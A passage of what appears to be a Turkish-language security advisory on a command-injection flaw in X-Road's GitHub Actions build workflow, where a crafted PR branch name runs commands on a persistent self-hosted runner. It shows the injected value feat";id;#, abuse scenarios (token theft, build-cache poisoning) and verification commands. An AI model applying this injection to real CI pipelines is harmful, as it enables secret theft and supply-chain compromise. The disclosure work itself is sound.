if [[ -n "feat";id;#" ]]; then
```
Bash bu satırı gördüğü anda `[[ -n "feat" ]]` kontrolünü bitirir ve noktalı virgülden sonraki **`id` komutunu doğrudan kalıcı `xrd-runner-8c` sunucusunda çalıştırır!** Üstelik bu adım henüz `actions/checkout` bile çalışmadan gerçekleşir.

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Özel Hazırlanmış PR Dal Adıyla Kod İncelemesi Başlamadan Kalıcı `xrd-runner-8c` Sunucusunda Komut Çalıştırılması:**
  1. PR iş akışını tetikleyebilen bir katkıcı veya ele geçirilmiş bir geliştirici hesabı, `feat";<komut>;#` adında bir dal gönderip Pull Request açar.
  2. Henüz PR içindeki kodlar incelenmeden ve hatta `actions/checkout` adımı çalışmadan önce `Setup build configuration` adımı `xrd-runner-8c` üzerinde çalışır ve dal adındaki kabuk komutunu doğrudan yürütür.
* **Senaryo B — `secrets: inherit` ve `packages: write` Yetkili `GITHUB_TOKEN` Anahtarının Ele Geçirilmesi:**
  1. Çağıran `build.yaml:50-58` dosyası `permissions: contents: write, packages: write` tanımladığı ve `secrets: inherit` ile `_build-and-package.yml` iş akışını çağırdığı için, aynı-depo PR'larında veya bakıcı tarafından onaylanan PR koşumlarında tüm aktarılan sırlar ve yazma yetkili `GITHUB_TOKEN` ortamda hazırdır.
  2. Enjekte edilen kabuk komutu bu anahtarları kullanarak GitHub Container Registry (`GHCR`) üzerindeki paketlere veya depo dallarına müdahale edebilir.
* **Senaryo C — Kalıcı Self-Hosted Runner (`xrd-runner-8c`) Önbelleğinin ve Sonraki Sürüm Derlemelerinin Zehirlenmesi:**
  1. `xrd-runner-8c` iş bitince silinen geçici bir VM değil, sonraki işlerde de kullanılmaya devam eden bir self-hosted sunucudur.
  2. Komut enjeksiyonuyla sunucudaki yerel Gradle/APT/Docker derleme önbelleğine veya arka plan süreçlerine müdahale edilerek, daha sonra yapılacak resmi X-Road paket derlemelerinin içine zararlı kod sızdırılabilir.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. _build-and-package.yml içindeki doğrudan ${{ github.head_ref }} interpolasyonunu kaynak kodda görme
sed -n '70,96p' "$HOME/audit-targets/X-Road/.github/workflows/_build-and-package.yml"

# 2. İzole yerel bash ortamında doğrudan interpolasyon (RED) ile ortam değişkeni parametrelendirmesini (GREEN) doğrulama
python3 pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_xroad_cand01
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "XROAD-CAND-01": {
    "ghsa_id": "GHSA-4fcw-7xqx-fjv5",
    "build_workflow": "x-road/.github/workflows/build.yaml",
    "package_workflow": "x-road/.github/workflows/_build-and-package.yml",
    "RED": {
      "direct_yaml_interpolation": true,
      "arbitrary_command_executed_on_self_hosted_runner": true
    },
    "GREEN": {
      "env_var_parameterized": true,
      "arbitrary_command_executed_on_self_hosted_runner": false
    }
  }
}
```
